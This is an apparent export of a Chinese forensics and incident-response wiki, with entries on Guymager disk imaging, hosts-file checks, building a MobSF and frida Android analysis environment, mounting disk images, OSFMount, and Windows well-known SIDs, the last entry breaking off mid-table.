-目前，支持i386和amd64系统，powerpc包可根据请求提供。\n执行如下命令: sudo apt-get update sudo apt-get install guymager-beta 以下方式启动程序 guymager尽管这个包被命名为guymager-beta，但它经过了密集的测试，是绝对稳定的软件。只是它还没有找到分销渠道。\nRPM packages RPM包可以在pkgs.org上获得。非常感谢拉里罗杰斯的包装!\n手动下载和安装Debian软件包 如果你不喜欢永久地添加pinguin库，你可以手动下载并安装这些包:\n浏览器访问deb.pinguin.lu，并选择与您的处理器架构(i386或amd64)相对应的目录。备注:amd64指的是架构，而不是处理器。因此，amd64适用于AMD和英特尔的64位处理器。 下载guymager测试版包。 从命令行安装:\n打开shell并获得根权限 切换到包含下载文件的目录。 使用如下命令进行安装: sudo apt-get update\nsudo dpkg -i guymager-beta_xxx_amd64.deb\nsudo apt-get -f install\nxxx表示版本号。如果你有一个32位系统，用i386替换amd64。\n第二个命令很可能返回一些丢失包的错误消息。它们通过执行第三个命令来安装。 有2个推荐的包，你应该安装: sudo apt-get install smartmontools hdparm\n用以下方式启动程序 guymager\n配置和日志 Guymager使用两个配置文件:\n/etc/guymager/guymager.cfg 主配置文件。你不要更改它，因为你的更改会在安装新版本的guymager时导致丢失配置。\n/etc/guymager/local.cfg 将此文件用于本地更改。这里调整的参数优先于guymager.cfg中的参数。guymager.cfg在其末尾包含local.cfg。如果一个参数被多次设置，guymager会保留最后的设置。\n如果您想在不编辑local.cfg的情况下快速尝试一个参数，你可以尝试一下内容。例如:\nguymager EwfCompression =BEST命令行位于两个配置文件的前面。有2个参数只能在命令行中设置:\ncfg 要使用的配置文件。默认为/etc/guymager/guymager.cfg。 log 要使用的日志文件。默认为/var/log/guymager.log。例子:\nguymager cfg=\"/tests/g_special.cfg\" log=\"/mylogs/guymager.log”配置参数很好地记录在/etc/guymager/guymager.cfg中。记住不要做任何改变。\n如果有任何问题，请查看日志文件/var/log/guymager.log。当报告问题时，请附加日志文件。\n手动编译源码 对于Debian和Ubuntu用户: 需要安装build-essential, qtbase5-dev and libparted-dev包。\n详情见 https://guymager.sourceforge.io/\nLive CD使用Guymager 在很多现有的CD或VM系统版本中都已收纳了guymager。\nCAINE TSURUGI BACKBOX KALI GRML ForLEx SANS SIFT (Vmware image) BitCurator (Live CD and VirtualBox image) 使用Guymager 由于guymager使用方法官方并未给出详细的使用说明，目前根据已有的一些网友的使用经验归纳总结。\nhttps://confluence.educopia.org/display/BC/Creating+a+Disk+Image+Using+Guymager\nhttps://www.secpulse.com/archives/138600.html\n在kali下创建磁盘镜像 启动到Live模式下 1、首先启动进入取证模式；\n2、接入移动硬盘，fdisk -l 确定移动硬盘的设备名为/dev/sdb1；\n3、挂载移动硬盘。\ncd /mnt\nmkdir udisk\nmount /dev/sdb1 /mnt/udisk\n使用Guymager 1、在目标硬盘上右键 Acquire image，\n设置相关信息、保存路径、文件名，开始获取磁盘镜像。\n下面的hash校验我勾掉了，是为了让速度更快一些。\n2、Start开始后，需要一段时间，由磁盘容量、速度与电脑性能决定。\n3、镜像制作完成。\n全磁盘镜像文件大小共4.7GB。\n磁盘实际使用大小是这样的。\nBitCurator下使用Guymager 官方wiki：https://github.com/BitCurator/bitcurator-access/wiki\nBitCurator Access项目开发了工具，以帮助图书馆，档案馆和博物馆提供基于Web的本地访问磁盘映像上保存的数字资料的途径。BitCurator访问工具简化了对原始和经过法医打包的磁盘映像的访问，使用户可以将这些对象合并到访问环境中，同时保留原始顺序和相关的环境上下文。这些工具使用开源数字取证软件库，可以对文件和文件系统的出处，文件的质量和可访问性，文件和文件系统中的元数据以及残留或隐藏的数据进行详细分析。\nBitCurator Access专注于与访问出生数字馆藏相关的四个感兴趣的领域：\n基于Web的对原始和经过司法鉴定打包的磁盘映像的访问 删除磁盘映像中的文件项，元数据和隐藏数据 用于旧磁盘映像的操作系统和可执行虚拟化 在收集环境中转换和使用数字取证元数据 其中就包含了部分关于Guymager工具的使用相关操作说明。\n原文：https://confluence.educopia.org/display/BC/Creating+a+Disk+Image+Using+Guymager\nBitCurator包含了一个开源的图形应用程序，用于创建磁盘映像——Guymager。Guymager支持原始dd图像，EO1和AFF图像格式。后两种图像格式通常在数字取证社区中使用，它们能够将关于原始媒体的元数据合并到磁盘映像本身中。\n按步指导 通过打开Nautilus(屏幕左上角的“Home”文件夹)，并在白色背景上的任何地方单击右键，创建一个用于存储磁盘图像的目录。从下拉菜单中选择“创建新文件夹”。按您认为合适的方式命名文件夹;在本例中，我们将使用文件夹名称“diskimages”。 请确保安全挂载设备，启用只读强制，和/或使用写阻塞程序，以防止无意中将数据写回磁盘。默认情况下，bitCurator环境被设置为强制只读访问。 将您想要映像的设备连接到您的计算机(USB闪存驱动器、CD-ROM、硬盘驱动器或软盘驱动器)。\n注意:Guymager不需要挂载设备，bitCurator不会自动挂载设备(在Unity栏左边出现的图标表示设备已挂载，而不是挂载)。如果需要在创建磁盘映像之前检查磁盘内容，可以安全地挂载设备。只需单击设备图标就可以安全地将可读文件系统(以只读模式)挂载到该设备上。\n右键单击桌面“成像工具”文件夹中的图标，打开Guymager。在上下文菜单中，选择“打开”。 Guymager将要求以root权限运行。当提示时，输入与bit策库用户帐户相关的密码(通常为’bcadmin’)。 启动Guymager时，它将显示系统上所有挂载的磁盘的列表。再次识别你想要图像的磁盘，右键单击它的列表，并选择“获取图像”。 点击获取图像将打开获取图像窗口。在此窗口中，您将首先选择您想要使用的磁盘映像格式。选项包括Linux dd原始镜像、专家取证格式(.E01)和高级取证镜像格式(.AFF）;专家取证或AFF镜像将在法医打包的镜像中存储用户添加的元数据。 注意:如果您选择Linux dd或Expert Witness格式，您可以选择将图像分割成多个文件，从而使其更容易转移。因此，例如，一个4GB的映像可以被分割成四个1GB的文件，或者两个2GB的文件，等等。\n选择镜像格式类型后，根据需要填写元数据。E01和AFF镜像是为数字取证社区设计的，因此字段被标记为刑事调查。然而，这些字段可以很容易地重新使用，以满足档案管理员和策展人的需要。例如，档案管理员可以使用“案例号”字段来记录登录号。 接下来选择镜像目录，在本例中为“/home/bcadmin/diskimages”。注意:Guymager是作为根用户运行的，所以您要避免直接通过Guymager创建新的目录(因此第1步)。 最后，命名磁盘映像并选择Guymager要执行的验证选项。点击“确定”开始成像过程。 一旦成像过程开始，您将被带回到图4中的Guymager主屏幕，该屏幕现在将显示一个进度条。 Guymager完成磁盘映像的创建后，关闭Guymager并通过导航到步骤#1中创建的目录来验证映像。注意，这里有两个文件，图像本身和一个信息文件(参见图3)。信息文件包括我们在步骤7中输入的元数据以及在获取过程中收集的附加元数据。现在，成像过程已经完成。 相关链接 http://sourceforge.net/projects/guymager/\nlinux下免费镜像取证工具（相关文章：https://blog.forensix.cn/2014/03/guymager-intro/）\nhttps://www.secpulse.com/archives/138600.html\n",
    "description": "",
    "tags": null,
    "title": "Guymager",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/Guymager/index.html"
  },
  {
    "content": "windows下host文件检查 windows下hosts目录位置是在C:\\Windows\\System32\\drivers\\etc下hosts文件\ntype C:\\Windows\\System32\\drivers\\etc\\hosts # 创建时间 dir C:\\Windows\\System32\\drivers\\etc\\hosts /t:C |find \"hosts\" # 修改时间 dir C:\\Windows\\System32\\drivers\\etc\\hosts /t:W |find \"hosts\" # 被访问时间 dir C:\\Windows\\System32\\drivers\\etc\\hosts /t:A |find \"hosts\" linux下host文件检查 linux下host文件位置在/etc/文件下hosts文件\ncat /etc/hosts stat /etc/hosts ",
    "description": "",
    "tags": null,
    "title": "hosts文件检查",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/hosts%E6%96%87%E4%BB%B6%E6%A3%80%E6%9F%A5/index.html"
  },
  {
    "content": "关于Mobsf一直没有看到比较全面的实战的教程或者最佳实践发出来，由于目前手头有的MAC+Android Studio，加上最近任务，就想组个动态分析本地可复用的虚拟环境，这里记录了下搭建过程，并给出了最近的任务动态分析结果。测试下来效果还不错，因为Mobsf在git上的维护还比较频繁觉得算是个不错的辅助工具。\n测试设备的一些简单信息摘要：\nMAC x86_64\nAndroid Studio AVD 安卓模拟器\n安卓版本Nexus_5X_API_26_64_api\nMobsf环境要求 静态分析要求 Mac\n安装 Git 安装 Python 3.8-3.9 After installing Python 3.8+, go to /Applications/Python 3.8/ and run Update Shell Profile.command and Install Certificates.command 安装 JDK 8+ 安装命令行工具 xcode-select --install 下载和安装 wkhtmltopdf 按照 WIKI操作指南 macOS Mojave 用户, 请安装 headers（如果可用）： sudo installer -pkg /Library/Developer/CommandLineTools/Packages/macOS_SDK_headers_for_macOS_10.14.pkg -target /Copy to clipboardErrorCopied Windows App静态分析需要Mac和Linux的Windows主机或Windows VM。 更多信息\n操作指南:\n安装 Git sudo apt-get install git 安装 Python 3.8-3.9 sudo apt-get install python3.8 安装 JDK 8+ sudo apt-get install openjdk-8-jdk 安装以下依赖项 sudo apt install python3-dev python3-venv python3-pip build-essential libffi-dev libssl-dev libxml2-dev libxslt1-dev libjpeg8-dev zlib1g-dev wkhtmltopdfCopy to clipboardErrorCopied Windows App静态分析需要Mac和Linux的Windows主机或Windows VM。 更多信息\nWindows\n安装 Git 安装 Python 3.8-3.9 安装 JDK 8+ 安装 Microsoft Visual C++ Build Tools 安装 OpenSSL (non-light) 下载和安装 wkhtmltopdf as per the WIKI操作指南 将包含 wkhtmltopdf 二进制文件的文件夹添加到环境变量PATH。 动态分析要求 如果您使用MobSF docker容器或在虚拟机中设置MobSF，则动态分析将不起作用。 安装 Genymotion 或者 Android Studio Emulator 安装 Linux/Mac git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git cd Mobile-Security-Framework-MobSF ./setup.shCopy to clipboardErrorCopied运行MobSF Linux/Mac ./run.sh 127.0.0.1:8000注意： MobSF动态分析需要满足的条件： • Genymotion Android VM version 4.1 - 10.0 (x86, upto API 29) • Android Emulator AVD (non production) version 5.0 - 9.0 (arm, arm64, x86, and x86_64 upto API 28)\nhttps://mobsf.github.io/docs/#/zh-cn/installation\n/Users/[your_name]/Library/Android/sdk/tools/emulator emulator -avd Nexus_5X_API_28 -writable-system\n配置动态分析 MobSF动态分析需要满足的条件： • Genymotion Android VM version 4.1 - 10.0 (x86, upto API 29) • Android Emulator AVD (non production) version 5.0 - 9.0 (arm, arm64, x86, and x86_64 upto API 28)\n这里使用的是Android Emulator AVD，安卓8.0+86x64+api版 这里根据自己的机器进行选择，测试主机机使用的mac x86架构，为了规避动态调试高版本安卓需要关闭OEM，Android Studio的AVD系统中找不到关闭OEM的尴尬处境，最终选择了安卓9以下的适配版本。如果你也用的AVD，建议直接使用8.0，防止remount failed问题找不到OEM关闭导致环境失败问题。\n确定好avd之后，更新mobsf配置，这里我的avd模拟器名为emulator-5554\n# =======ANDROID DYNAMIC ANALYSIS SETTINGS=========== ANALYZER_IDENTIFIER = 'emulator-5554' FRIDA_TIMEOUT = 4这里的原理可以通过下面这个命令理解，他是通过adb -s 指定devicename的。ANALYZER_IDENTIFIER也就是使用adb devices中的内容即可。\n'['/Users/xt/Library/Android/sdk/platform-tools/adb', '-s', 'emulator-5554', 'shell', 'pm', 'list', 'packages', '-f', '-3']'查看自己的device name\n╭─xt@MacBook-Pro ~/Downloads/data ╰─$ adb devices List of devices attached emulator-5554\tdevice创建模拟器恢复点 需要创建用于后续恢复的还原点，这里需要准备frida-server用于动态调试。这里官方的原文说明中没有给出，因此我们总结如下 ：\n下载frida-server 参考：https://github.com/frida/frida/releases 如果是在mac x86架构64位下面使用模拟器进行调试，下载frida-server-x.x.x-android-x86_64，如果是使用实体手机进行运行的话，下载frida-server-x.x.x-android-arm，根据测试时间使用的最新版本以及适配的类型，我这选择frida-server-15.1.4-android-x86_64下载。 adb push到模拟器中 cd ~/Downloads # 到存放frida-server-15.1.4-android-x86_64解压完成的目录下 adb root adb push frida-server-15.1.4-android-x86_64 /data/local/tmp/ frida-server-15.1.4-android-x86_64: 1 ... 118.1 MB/s (97874840 bytes in 0.790s) # 修改frida-server权限，并且在后台开启启用 chmod 777 frida-server-15.1.4-android-x86_64 nohup ./frida-server-15.1.4-android-x86_64 \u0026 # 在后台运行frida-server服务环境布置完，拍摄快照用于保存环境情况：\n相关链接： mobsf frida错误https://github.com/MobSF/Mobile-Security-Framework-MobSF/issues/1828 mac安装frida-serverhttps://www.jianshu.com/p/15a4bf14d0a5\n启动模拟器 AVD环境准备好后，启动模拟器，这里需要注意找到本地模拟器位置，~/Library/Android/sdk/emulator ，还要使用可写模式启动：\n╭─xt@MacBook-Pro ~/Library/Android/sdk/emulator ╰─$ emulator -avd Nexus_5X_API_26_64_api -writable-system一句话开启模拟器环境+可写模式+不保存模式，但是由于无法拍照会经常崩溃，而且经常我的快照收到影响，这里不推荐，只能算提一下思路。\nemulator -avd Nexus_5X_API_26_64_api -no-snapshot-save -writable-system -snapshot 干净系统+fridaserver开启运行测试动态分析 设置代理，这里直接使用的是我本地的SSR export http_proxy=127.0.0.1:1087 export https_proxy=127.0.0.1:1087\n运行mobsf mobsf 127.0.0.1:8000\n进入动态分析 点击dynamic进入动态分析界面 同时check终端，一切正常 配置完成 在开始动态分析之前，开启frida-server，由于每次进入动态分析界面，mobsf会自动重启adb环境，因此这里需要重新载入前面配置好的frida-server镜像。或者手动进入adb shell启动frida-server即可。 点击start instrumentation 即可动态分析\n检测正常、导出功能正常\n排坑 问题：“MobSF cannot find android instance identifier. Make sure that an android instance is running and refresh this page. If this error persists, Please set ANALYZER_IDENTIFIER in /Users/xt/.MobSF/config.py or via environment variable ANALYZER_IDENTIFIER.”\n问题：\nVM's /system is not writable. This VM cannot be used for Dynamic Analysis. [ERROR] 20/Oct/2021 05:27:51 - Please start the AVD as per MobSF documentation! raise CalledProcessError(retcode, process.args, subprocess.CalledProcessError: Command '['/Users/xt/Library/Android/sdk/platform-tools/adb', '-s', 'emulator-5554', 'shell', 'pm', 'list', 'packages', '-f', '-3']' returned non-zero exit status 1.解决： 目前（使用 Build Tools v26，如果 Google 没有像他们那样经常更改内容），如果您-writable-system在从命令行启动模拟器时使用该指令，它将允许/system通过重新启动持久化分区。也就是说，您将能够写入/system分区，如果您重新启动，更改仍将保留。 emulator -avd \u003cAVD_NAME -writable-system 这也将您对qcow2图像文件的更改通常保存在.android/avd/\u003cAVD_NAME.avd/system.img.qcow2 您甚至可以复制此system.img.qcow2文件，使用-wipe-data指令从 AVD 中擦除数据，将此文件放回目录中，重新启动，您最初所做的系统更改仍将保留。（警告：至少现在，因为谷歌一直在改变事物） 参考：https://stackoverflow.com/questions/15417105/forcing-the-android-emulator-to-store-changes-to-system\n问题：\n╰─$ emulator -avd Nexus_5X_API_26_64_api -writable-system [4710067712]:ERROR:android/android-emu/android/qt/qt_setup.cpp:28:Qt library not found at ../emulator/lib64/qt/lib Could not launch '/Users/xt/Library/Android/sdk/../emulator/qemu/darwin-x86_64/qemu-system-x86_64': No such file or directory解决：\n关闭模拟器\ncd ~/Library/Android/sdk/emulator\nemulator -avd Nexus_5X_API_26_64_api -writable-system\n顺利启动了\n问题： Cannot download frida-server binary. You will need frida-server-15.0.8-android-x86_64 in /Users/xt/.MobSF/downloads/ for Dynamic Analysis to work 解决过程：\n重新安装frida 参考：https://www.jianshu.com/p/15a4bf14d0a5 adb push adb push frida-server-15.1.4-android-x86_64 /data/local/tmp/ frida-server-15.1.4-android-x86_64: 1 … 118.1 MB/s (97874840 bytes in 0.790s) (实体机一般frida-server-15.1.4-android-arm64，模拟器一般frida-server-15.1.4-android-x86_64，我这里使用的mac是x86架构64位的)\nchmod u+x frida-server-15.1.4-android-x86_64 ./frida-server-15.1.4-android-x86_64\n问题： remount of the / superblock failed: Permission denied 解决： adb root adb disable-verity adb reboot adb root adb remount 参考：https://blog.csdn.net/qq_43804080/article/details/102586939\n问题：remount of the / superblock failed: Permission denied remount failed 解决： 关闭OEM 然后再执行 adb root adb disable-verity adb reboot adb root adb remount\n问题： requests.exceptions.ReadTimeout: HTTPSConnectionPool(host=‘raw.githubusercontent.com’, port=443): Read timed out. (read timeout=3) 解决： 挂代理、模拟器挂代理\nmobsf参考： http://purpleroc.com/MD/2016-08-31@Android Malware Analysis Tool(1)–MobSF.html\n问题：adb的一些坑\nadb shell\nerror: more than one device and emulator\nadb devices adb shell -s\n如果实际上只有一个设备或模拟器，并且查到有offline的状态；那就说明是ADB本身的BUG所导致的，就需要用如下的方法处理下了：\nadb kill-server taskkill /f /im adb\n第一条命令是杀ADB的服务，第二条命令是杀ADB的进程！ 如果第一条没有用，才考虑用第二条命令再试试看的！\n",
    "description": "",
    "tags": null,
    "title": "Mobsf_MAC_AVD_Android动静态环境搭建排坑实战",
    "uri": "/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E5%AE%89%E5%8D%93%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/Mobsf_MAC_AVD_Android%E5%8A%A8%E9%9D%99%E6%80%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E6%8E%92%E5%9D%91%E5%AE%9E%E6%88%98/index.html"
  },
  {
    "content": "linux基本命令挂载镜像下一般使用mount命令挂载硬盘或镜像。目前没有找到相关取证类型的格式挂载方式。如E01，L01，AFF格式可能目前还需要windows进行挂载处理。\n支持的镜像格式： raw/img/iso 准备阶段 常用的语句 df -Th 查看当前系统的分区情况\nfdisk -l 查看当前系统分区信息详情\nmount 挂载分区\nunmount 卸载分区\nlinux分区挂载点介绍 /boot　启动分区，一般设置100M-200M，boot目录包含了操作系统的内核和在启动系统过程中所要用到的文件 /　根分区,所有未指定挂载点的目录都会放到这个挂载点下 /home　用户目录，一般每个用户100M左右，特殊用途，比如放大文件也可再加上G。分区大小取决于用户多少。对于多用户使用的电脑，建议把/home独立出来，而且还可以很好地控制普通用户权限等，比如对用户或者用户组实行磁盘配额限制、用户权限访问等. /tmp　临时文件目录，一般设置1-5G，方便加载ISO镜像文件使用，对于多用户系统或者网络服务器来也有独立挂载的必要。临时文件目录，也是最常出现问题的目录之一. /usr　系统资源，一般设置要3-15G，大部分的用户安装的软件程序都在这里。就像是Windows目录和Program Files目录。很多Linux家族系统有时还会把/usr/local单独作为挂载点使用。 /var　可变数据目录，包含系统运行时要改变的数据。通常这些数据所在的目录的大小是要经常变化的，系统日志记录也在/var/log下。一般多用户系统或者网络服务器要建立这个分区，设立这个分区，对系统日志的维护很有帮助。一般设置2-3G大小，也可以把硬盘余下空间全部分为var. /srv　系统服务目录,用来存放service服务启动所需的文件资料目录，不常改变。 /opt　附加应用程序目录，存放可选的安装文件，个人一般把自己下载的软件资料存在里面，比如Office、QQ等等. swap　交换分区,一般为内存2倍，最大指定2G即可 /bin　二进制可执行目录，存放二进制可执行程序，里面的程序可以直接通过命令行调用，而不需要进入程序所在的文件夹 /sbin　系统管理员命令存放目录,存放标准系统管理员文件 /dev　存放设备文件,驱动文件等挂载镜像方法： 挂载raw格式镜像 使用loop方式挂载raw格式镜像\n虚拟机的镜像可以直接通过loop的方式来进行挂载，这种方式你必须先计算出镜像中每个分区的偏移量（fdisk -lu可查看），然后通过loop的方式的挂载，加上偏移量\n[root@centos images]# cd /var/lib/libvirt/images/ [root@centos images]# fdisk -lu ubuntu.raw You must set cylinders. You can do this from the extra functions menu. Disk ubuntu.raw: 0 MB, 0 bytes 255 heads, 63 sectors/track, 0 cylinders, total 0 sectors Units = sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disk identifier: 0x000ccae5 Device Boot Start End Blocks Id System ubuntu.raw1 * 2048 38862847 19430400 83 Linux Partition 1 has different physical/logical endings: phys=(1023, 254, 63) logical=(2419, 25, 38) ubuntu.raw2 38864894 40957951 1046529 5 Extended Partition 2 has different physical/logical beginnings (non-Linux?): phys=(1023, 254, 63) logical=(2419, 58, 6) Partition 2 has different physical/logical endings: phys=(1023, 254, 63) logical=(2549, 131, 14) ubuntu.raw5 38864896 40957951 1046528 82 Linux swap / Solaris [root@centos images]# echo $((2048*512)) 1048576 [root@centos images]# mount -o loop,offset=1048576 ubuntu.raw /image/ [root@centos images]# umount /image/挂载img格式镜像 步骤：\n获取可以挂载的环回设备： [root@virtserver ~]# losetup -f /dev/loop0 进行块设备挂载： losetup /dev/loop0 abc.img 执行块设备的分区映射： kpartx -a /dev/loop0 查看映射分区入口： ls /dev/mapper/ 通过fdisk -l查看磁盘情况。找到需要挂载的数据分区。 mount分区： mount /dev/mapper/vg_lbrhel-lv_root /mnt/ 卸载步骤： 1.umount 2.kpartx -d 3.losetup -d挂载iso格式镜像 挂载 mount -t iso9660 -o loop /root/xxx.iso /mnt 查看 ls /mnt 卸载 umount /mnt文章参考链接 https://blog.csdn.net/cnyyx/article/details/28302679\nhttps://blog.csdn.net/klyhuntermax/article/details/51907856\n",
    "description": "",
    "tags": null,
    "title": "mount_command",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/mount_command/index.html"
  },
  {
    "content": "概况： OSFMount允许将Windows中的本地磁盘镜像文件(整个磁盘或磁盘分区的逐位拷贝)作为物理磁盘或逻辑驱动器号挂载。然后，您可以使用PassMark OSForensics™来分析磁盘映像文件，方法是使用PassMark OSForensics™指定物理磁盘名称(例如，\\.\\PhysicalDrive1)或逻辑驱动器号(例如:Z:)。\n默认情况下，映像文件被挂载为只读，因此原始映像文件不会被更改。\nOSFMount支持在“写缓存”模式下以读写方式挂载磁盘镜像文件。它将所有的写操作存储到一个“写缓存”(或“增量”)文件中，该文件保存了原始磁盘映像文件的完整性。\nOSFMount还支持创建RAM磁盘，基本上就是挂载到RAM中的磁盘。这通常比使用硬盘有很大的速度优势。因此，这对于需要高速磁盘访问的应用程序非常有用，比如数据库应用程序、游戏(如游戏缓存文件)和浏览器(缓存文件)。第二个好处是安全性，因为磁盘内容不是存储在物理硬盘上(而是存储在RAM中)，并且在系统关闭时，磁盘内容不是持久的。在撰写本文时，我们相信这是目前最快的RAM驱动软件。\nOSFMount支持以.iso格式挂载CD的映像，当经常使用特定的CD并且访问速度很重要时这很有用。\n特性 支持的高级取证格式的版本是AFFv3与zlib压缩支持。不支持加密和签名。 下载 官方下载地址https://www.osforensics.com/tools/mount-disk-images.html\n运行环境 Win 7 SP1, Win 8, Win 10\nWindows Server 2008, 2012 (Windows Server 2016有问题)\n64位支持(对于32位支持，请使用OSFMount v2)\n用户必须具有管理员权限。\nRAM: 1GB(挂载大磁盘映像时，RAM越多越好)\n硬盘空间:15mb可用硬盘空间用于安装文件。\n支持镜像 原始RAM镜像如dd CD镜像如iso Ø 这里尝试E01镜像，注意耐心等待镜像制作完成（测试中发现存在后台延迟完成，前端显示完成情况），并且使用OSFMount挂载打开。（20200415验证发现当镜像制作中断或因磁盘空间不足导致中断都将，导致E01镜像无法挂载，并且E01的镜像是分很多小块保存的，测试中使用accessData FTK Imager无法挂载，但是OSFMount挂载成功）\n使用 使用OSFMount挂载镜像 点击mount now\n选择镜像挂载\n这里选择选择readonly\n点击mount即可\n",
    "description": "",
    "tags": null,
    "title": "OSFMount",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/OSFMount/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "Powershell",
    "uri": "/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Windows/Powershell/index.html"
  },
  {
    "content": "众所周知的安全标识符(SID) 标识通用组和通用用户。例如，有一些众所周知的 SID 来标识以下组和用户：\n每个人或世界，这是一个包含所有用户的组。\nCREATOR_OWNER，用作可继承 ACE 中的占位符。继承 ACE 时，系统将 CREATOR_OWNER SID 替换为对象创建者的 SID。\n本地计算机上内置域的管理员组。·\n有通用的众所周知的 SID，它们在使用此安全模型的所有安全系统上都有意义，包括Windows 以外的操作系统。此外，还有一些众所周知的 SID 仅在 Windows 系统上才有意义。\nWindows API 为众所周知的标识符权限和相对标识符(RID) 值定义了一组常量。您可以使用这些常量来创建众所周知的 SID。以下示例结合了 SECURITY_WORLD_SID_AUTHORITY 和 SECURITY_WORLD_RID 常量来显示代表所有用户（每个人或世界）的特殊组的通用知名 SID：\nS-1-1-0\n此示例使用 SID 的字符串表示法，其中 S 将字符串标识为 SID，第一个 1 是 SID 的修订级别，其余两位数字是 SECURITY_WORLD_SID_AUTHORITY 和 SECURITY_WORLD_RID 常量。\n您可以使用AllocateAndInitializeSid函数通过将标识符权限值与最多八个子权限值组合来构建 SID。例如，要确定登录用户是否是特定知名组的成员，请调用AllocateAndInitializeSid为知名组构建 SID，并使用EqualSid函数将该 SID 与用户所在组中的组 SID 进行比较。访问令牌。有关示例，请参阅在 C++ 中的访问令牌中搜索 SID。您必须调用FreeSid函数来释放由AllocateAndInitializeSid 分配的 SID 。\n本节的其余部分包含可用于构建知名 SID 的已知 SID 表以及标识符权限和子权限常量表。\n以下是一些通用的知名 SID。\n通用知名 SID 字符串值 识别 Null SID S-1-0-0 一个没有成员的组。这通常在 SID 值未知时使用。 World S-1-1-0 包含所有用户的组。 Local S-1-2-0 登录到本地（物理）连接到系统的终端的用户。 Creator Owner ID S-1-3-0 要由创建新对象的用户的安全标识符替换的安全标识符。此 SID 用于可继承的 ACE。 Creator Group ID S-1-3-1 要由创建新对象的用户的主要组 SID 替换的安全标识符。在可继承的 ACE 中使用此 SID。 下表列出了预定义的标识符权限常量。前四个值与通用的众所周知的 SID 一起使用；最后一个值用于 Windows 众所周知的 SID。\n标识符权限 价值 字符串值 SECURITY_NULL_SID_AUTHORITY 0 S-1-0 SECURITY_WORLD_SID_AUTHORITY 1 S-1-1 SECURITY_LOCAL_SID_AUTHORITY 2 S-1-2 SECURITY_CREATOR_SID_AUTHORITY 3 S-1-3 SECURITY_NT_AUTHORITY 5 S-1-5 以下RID值与通用的众所周知的 SID 一起使用。标识符权限列显示标识符权限的前缀，您可以将 RID 与其组合以创建通用的知名 SID。\n相对标识符权限 价值 字符串值 SECURITY_NULL_RID 0 S-1-0 SECURITY_WORLD_RID 0 S-1-1 SECURITY_LOCAL_RID 0 S-1-2 SECURITY_LOCAL_LOGON_RID 1 S-1-2 SECURITY_CREATOR_OWNER_RID 0 S-1-3 SECURITY_CREATOR_GROUP_RID 1 S-1-3 SECURITY_NT_AUTHORITY (S-1-5) 预定义标识符权限生成的 SID 不是通用的，但仅在 Windows 安装上有意义。您可以将以下 RID 值与 SECURITY_NT_AUTHORITY 一起使用来创建众所周知的 SID。\n持续的 字符串值 识别 SECURITY_DIALUP_RID S-1-5-1 使用拨号调制解调器登录终端的用户。这是一个组标识符。 SECURITY_NETWORK_RID S-1-5-2 通过网络登录的用户。这是通过网络登录时添加到进程令牌的组标识符。对应的登录类型是 LOGON32_LOGON_NETWORK。 SECURITY_BATCH_RID S-1-5-3 使用批处理队列工具登录的用户。这是在作为批处理作业记录时添加到进程令牌的组标识符。对应的登录类型是 LOGON32_LOGON_BATCH。 SECURITY_INTERACTIVE_RID S-1-5-4 登录进行交互操作的用户。这是在交互登录时添加到进程令牌的组标识符。对应的登录类型是 LOGON32_LOGON_INTERACTIVE。 SECURITY_LOGON_IDS_RID S-1-5-5- X - Y 登录会话。这用于确保只有给定登录会话中的进程才能访问该会话的窗口站对象。对于每个登录会话，这些 SID的X和Y值都不同。值 SECURITY_LOGON_IDS_RID_COUNT 是此标识符 (5- X - Y )中 RID 的数量。 SECURITY_SERVICE_RID S-1-5-6 授权作为服务登录的帐户。这是在将进程作为服务记录时添加到进程令牌的组标识符。对应的登录类型是 LOGON32_LOGON_SERVICE。 SECURITY_ANONYMOUS_LOGON_RID S-1-5-7 匿名登录或空会话登录。 SECURITY_PROXY_RID S-1-5-8 代理。 SECURITY_ENTERPRISE_CONTROLLERS_RID S-1-5-9 企业控制器。 SECURITY_PRINCIPAL_SELF_RID S-1-5-10 PRINCIPAL_SELF 安全标识符可用于用户或组对象的 ACL。在访问检查期间，系统将 SID 替换为对象的 SID。PRINCIPAL_SELF SID 可用于指定适用于继承 ACE 的用户或组对象的可继承 ACE。它是在模式的默认安全描述符中表示已创建对象的 SID 的唯一方法。 SECURITY_AUTHENTICATED_USER_RID S-1-5-11 经过身份验证的用户。 SECURITY_RESTRICTED_CODE_RID S-1-5-12 受限代码。 SECURITY_TERMINAL_SERVER_RID S-1-5-13 终端服务。自动添加到登录到终端服务器的用户的安全令牌。 SECURITY_LOCAL_SYSTEM_RID S-1-5-18 操作系统使用的特殊帐户。 SECURITY_NT_NON_UNIQUE S-1-5-21 小岛屿发展中国家并不是独一无二的。 SECURITY_BUILTIN_DOMAIN_RID S-1-5-32 内置系统域。 SECURITY_WRITE_RESTRICTED_CODE_RID S-1-5-33 编写受限代码。 以下 RID 与每个域相关。\nRID 价值 识别 DOMAIN_ALIAS_RID_CERTSVC_DCOM_ACCESS_GROUP 0x0000023E 可以使用分布式组件对象模型 (DCOM) 连接到证书颁发机构的用户组。 DOMAIN_USER_RID_ADMIN 